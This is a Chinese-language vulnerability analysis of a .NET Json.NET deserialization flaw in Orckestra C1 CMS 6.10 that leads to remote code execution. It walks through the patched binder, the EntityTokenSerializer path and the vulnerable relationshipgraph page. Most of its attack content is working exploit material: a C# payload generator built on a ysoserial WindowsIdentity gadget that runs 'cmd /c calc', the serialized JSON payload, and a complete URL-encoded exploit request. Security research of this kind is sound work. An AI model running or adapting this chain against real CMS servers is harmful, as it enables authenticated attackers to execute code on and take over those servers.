漏洞描述
⽇常逛zdi发现的洞，Orckestra C1 CMS 6.10存在 .net 反序列化漏洞，需要登录，成因是因
为 TypeNameHandling.Auto
环境搭建
下载 https://github.com/Orckestra/C1-CMS-Foundation/releases/download/v6.10/C1.CMS.6.10.zip
然后Visual Studio打开运⾏。
分析
根据cve描述和补丁对⽐发现漏洞点存在于Composite.dll，使⽤github的对⽐发现在此commit中增加了对反序列
化绑定类型的校验。
https://github.com/Orckestra/C1-CMS-Foundation/commit/73dc26050e5f3ffc31531aa332463de9398bc213
⽽我在之前的⽂章中写过，json.net如果使⽤了TypeNameHandling.All或者TypeNameHandling.Auto，会造成反
序列化问题。官⽅建议如果使⽤TypeNameHandling要使⽤binder来控制反序列化的类型。
那么根据补丁我们来看6.10版本的CompositeSerializationBinder类
有漏洞的6.10版本中判断了assemblyName等于 Composite.Generated 并且typeName以CompositeGenerated
开头，进⾏⾃写类的type逻辑处理，别的type直接调⽤基类，那么等于没做限制。
CompositeSerializationBinder被⽤在CompositeJsonSerializer类中，其中有两个静态⽅法需要注意
直接传⼊json字符串然后反序列化，并且TypeNameHandling为auto。
第⼆个静态⽅法⽐较关键
分别获取json中的meta:obj、meta:type，然后根据type反射获取其Deserialize⽅法，如果为空则调⽤上⾯的第⼀
个静态⽅法，传⼊meta:obj标签的值，直接反序列化。
我们可以构造payload如下
当type获取不到静态Deserialize⽅法时，进⼊ CompositeJsonSerializer.Deserialize(text)
那么这两个点都可控，接着我们看哪⾥调⽤了这个⽅法。
{"meta:obj":"","meta:type":""}
EntityTokenSerializer.Deserialize(string)调⽤其两个参数的重载⽅法，经过
CompositeJsonSerializer.IsJsonSerialized(serializedEntityToken)判断进
⼊ CompositeJsonSerializer.Deserialize(serializedEntityToken, 
includeHashValue)
这⾥接受的类型为EntityToken，所以我们需要寻找EntityToken中可以存储payload的地⽅，例如⼀个object类型
的字段。
我们可以通过⼏⾏代码来寻找哪些类继承了EntityToken类
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
        foreach (var assembly in assemblies)
        {
            if (assembly.FullName.Contains("Composite"))
            {
                Type[] types = assembly.GetTypes();
                foreach (var type in types)
                {
                    try
                    {
                        if (!typeof(EntityToken).IsAssignableFrom(method.ReturnType))
                        {
                            continue;
                        }
                        else
                        {
                            var memberInfos = 
type.GetProperties(BindingFlags.NonPublic|BindingFlags.Instance|BindingFlags.Public);
                            foreach (var member in memberInfos)
                            {
                                resp($"type:{type.Name} 字段名:{member.Name} 类型:
{member.PropertyType}");
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }
        }
发现DataGroupingProviderHelperEntityToken类中GroupingValues是⼀个 Dictionary 类
型，可以存放gadget。
那么可以构造payload
using Composite.C1Console.Elements.ElementProviderHelpers.DataGroupingProviderHelper;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Text;
namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            // .\ysoserial.exe -f binaryformatter -g TextFormattingRunProperties -c 
calc --minify
            var windowsIdentity = new 
WindowsIdentityIdentityMarshal("AAEAAAD/////AQAAAAAAAAAMAgAAABtNaWNyb3NvZnQuUG93ZXJTaGV
sbC5FZGl0b3IFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dG
luZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAD6AjxPYmplY3REYXRhUHJvdmlkZ
XIgTWV0aG9kTmFtZT0iU3RhcnQiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIw
MDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOmE9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2F
zc2VtYmx5PVN5c3RlbSI+PE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT48YTpQcm9jZXNzPjxhOl
Byb2Nlc3MuU3RhcnRJbmZvPjxhOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjYWxjIiBGaWxlTmFtZ
T0iY21kIi8+PC9hOlByb2Nlc3MuU3RhcnRJbmZvPjwvYTpQcm9jZXNzPjwvT2JqZWN0RGF0YVByb3ZpZGVyLk9i
amVjdEluc3RhbmNlPjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=");
            Dictionary dictionary = new Dictionary { };
            dictionary.Add("asd", windowsIdentity);
⽣成之后替换⼀下程序集名称
            DataGroupingProviderHelperEntityToken dataGroupingProviderHelperEntityToken 
= new 
DataGroupingProviderHelperEntityToken(typeof(DataGroupingProviderHelperEntityToken).Ass
emblyQualifiedName);
            dataGroupingProviderHelperEntityToken.GroupingValues = dictionary;
            StringBuilder sb = new StringBuilder();
            using (StringWriter sw = new StringWriter(sb))
            using (JsonTextWriter writer = new JsonTextWriter(sw))
            {
                writer.QuoteChar = '\'';
                JsonSerializer ser = new JsonSerializer();
                ser.TypeNameHandling = TypeNameHandling.All;
                ser.Serialize(writer, dataGroupingProviderHelperEntityToken);
            }
            Console.WriteLine(sb);
            Console.ReadKey();
        }
    }
    [Serializable]
    public class WindowsIdentityIdentityMarshal : ISerializable
    {
        public WindowsIdentityIdentityMarshal(string b64payload)
        {
            B64Payload = b64payload;
        }
        private string B64Payload { get; }
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Console.WriteLine(typeof(WindowsIdentity).AssemblyQualifiedName);
            info.SetType(typeof(WindowsIdentity));
            info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
        }
    }
}
然后再找⼀下哪⾥调⽤了 EntityTokenSerializer.Deserialize(serializedEntityToken);
c:\Website\Composite\content\views\relationshipgraph\Default.aspx.cs
直接get传⼊EntityToken进⾏反序列化。
由此构造payload
{'$type':'Composite.C1Console.Elements.ElementProviderHelpers.DataGroupingProviderHelpe
r.DataGroupingProviderHelperEntityToken, 
Composite','Type':'Composite.C1Console.Elements.ElementProviderHelpers.DataGroupingProv
iderHelper.DataGroupingProviderHelperEntityToken, Composite, Version=6.10.7583.21856, 
Culture=neutral, PublicKeyToken=null','Source':'','Id':'','GroupingValues':
{'$type':'System.Collections.Generic.Dictionary`2[[System.String, mscorlib],
[System.Object, mscorlib]], mscorlib','asd':
{'$type':'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, 
Culture=neutral, 
PublicKeyToken=b77a5c561934e089','System.Security.ClaimsIdentity.actor':'AAEAAAD/////AQ
AAAAAAAAAMAgAAABtNaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1Z
GlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVz
aAECAAAABgMAAAD6AjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIHhtbG5zPSJodHRwOi8
vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOmE9ImNsci
1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSI+PE9iamVjdERhdGFQcm92aWRlc
i5PYmplY3RJbnN0YW5jZT48YTpQcm9jZXNzPjxhOlByb2Nlc3MuU3RhcnRJbmZvPjxhOlByb2Nlc3NTdGFydElu
Zm8gQXJndW1lbnRzPSIvYyBjYWxjIiBGaWxlTmFtZT0iY21kIi8+PC9hOlByb2Nlc3MuU3RhcnRJbmZvPjwvYTp
Qcm9jZXNzPjwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjwvT2JqZWN0RGF0YVByb3ZpZGVyPg
s='}},'Payload':null,'SerializedTypeName':'Composite.C1Console.Elements.ElementProvider
Helpers.DataGroupingProviderHelper.DataGroupingProviderHelperEntityToken, Composite, 
Version=6.10.7583.21856, Culture=neutral, PublicKeyToken=null'}
其中 "meta:type":"System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, 
Culture=neutral, PublicKeyToken=b77a5c561934e089" 这个类型可以随便给，只要实现序列化接⼝就⾏。
拓展
http://localhost:36859/Composite/content/views/relationshipgraph/Default.aspx?
EntityToken={"meta:obj":"
{'$type':'Composite.C1Console.Elements.ElementProviderHelpers.DataGroupingProviderHelpe
r.DataGroupingProviderHelperEntityToken, 
Composite','Type':'Composite.C1Console.Elements.ElementProviderHelpers.DataGroupingProv
iderHelper.DataGroupingProviderHelperEntityToken, Composite, Version=6.10.7583.21856, 
Culture=neutral, PublicKeyToken=null','Source':'','Id':'','GroupingValues':
{'$type':'System.Collections.Generic.Dictionary`2[[System.String, mscorlib],
[System.Object, mscorlib]], mscorlib','asd':
{'$type':'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, 
Culture=neutral, 
PublicKeyToken=b77a5c561934e089','System.Security.ClaimsIdentity.actor':'AAEAAAD%2F%2F%
2F%2F%2FAQAAAAAAAAAMAgAAABtNaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IFAQAAAEJNaWNyb3NvZnQuVml
zdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm
91bmRCcnVzaAECAAAABgMAAAD6AjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIHhtbG5zP
SJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5z
OmE9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSI%2BPE9iamVjdERhd
GFQcm92aWRlci5PYmplY3RJbnN0YW5jZT48YTpQcm9jZXNzPjxhOlByb2Nlc3MuU3RhcnRJbmZvPjxhOlByb2Nl
c3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjYWxjIiBGaWxlTmFtZT0iY21kIi8%2BPC9hOlByb2Nlc3MuU3Rhc
nRJbmZvPjwvYTpQcm9jZXNzPjwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjwvT2JqZWN0RGF0
YVByb3ZpZGVyPgs%3D'}},'Payload':null,'SerializedTypeName':'Composite.C1Console.Elements
.ElementProviderHelpers.DataGroupingProviderHelper.DataGroupingProviderHelperEntityToke
n, Composite, Version=6.10.7583.21856, Culture=neutral, 
PublicKeyToken=null'}","meta:type":"System.Security.Principal.WindowsIdentity, 
mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
c1cms历史洞6.5版本以前还有⼀个CVE-2019-18211，也是EntityTokenSerializer出的问题，
在EntityTokenSerializer.cs中，
如果不以 { 开头则进⼊DeserializeLegacy
⽽这个⽅法中可以调⽤任意类的Deserialize(string)静态⽅法，于是找到了
Microsoft.Practices.EnterpriseLibrary.Logging.Formatters.BinaryLogFormatter
造成反序列化rce